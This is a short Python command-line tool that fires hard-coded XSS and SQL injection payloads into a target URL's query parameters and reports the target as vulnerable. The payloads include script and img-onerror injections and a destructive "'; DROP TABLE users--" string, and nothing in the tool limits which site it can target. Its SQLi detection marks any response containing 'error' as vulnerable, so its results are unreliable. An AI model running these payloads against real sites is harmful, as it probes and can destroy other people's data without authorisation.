import requests
import urllib.parse
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def scan_xss(url, payloads):
    print(f"{Fore.CYAN}[XSS] Scanning {url} with {len(payloads)} payloads...{Style.RESET_ALL}")
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)

    for param in query_params:
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = payload
            new_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            try:
                r = requests.get(test_url, timeout=5)
                if payload in r.text:
                    print(f"{Fore.GREEN}[VULNERABLE] XSS found with payload: {payload}{Style.RESET_ALL}")
                    print(f"{Fore.MAGENTA}[URL] {test_url}{Style.RESET_ALL}")
                    return
            except Exception as e:
                print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")

    print(f"{Fore.YELLOW}[INFO] No XSS vulnerabilities found.{Style.RESET_ALL}")


def scan_sqli(url, payloads):
    print(f"{Fore.CYAN}[SQLi] Scanning {url} with {len(payloads)} payloads...{Style.RESET_ALL}")
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)

    for param in query_params:
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = payload
            new_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            try:
                r = requests.get(test_url, timeout=5)
                if "mysql" in r.text.lower() or "syntax" in r.text.lower() or "error" in r.text.lower():
                    print(f"{Fore.GREEN}[VULNERABLE] SQL Injection found with payload: {payload}{Style.RESET_ALL}")
                    print(f"{Fore.MAGENTA}[URL] {test_url}{Style.RESET_ALL}")
                    return
            except Exception as e:
                print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")

    print(f"{Fore.YELLOW}[INFO] No SQLi vulnerabilities found.{Style.RESET_ALL}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Target URL with parameters")
    parser.add_argument("--scan", required=True, choices=["xss", "sqli", "all"])
    args = parser.parse_args()

    xss_payloads = ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"]
    sqli_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users--"]

    if args.scan in ["xss", "all"]:
        scan_xss(args.url, xss_payloads)
    if args.scan in ["sqli", "all"]:
        scan_sqli(args.url, sqli_payloads)
